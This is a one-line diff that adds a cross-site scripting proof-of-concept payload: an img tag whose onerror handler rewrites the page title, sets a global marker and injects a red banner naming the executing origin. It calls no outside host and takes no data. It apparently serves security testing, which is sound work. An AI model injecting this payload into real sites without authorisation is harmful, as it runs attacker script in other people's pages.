@@ -1,0 +1,1 @@
+<img src=x onerror="document.title='XSS@'+document.domain;window.__xss_poc=document.domain;var d=document.createElement('div');d.id='xss-marker';d.style.cssText='position:fixed;top:0;left:0;z-index:99999;background:red;color:#fff;font:16px monospace;padding:8px';d.textContent='XSS executed in origin '+document.domain;document.body.appendChild(d);">
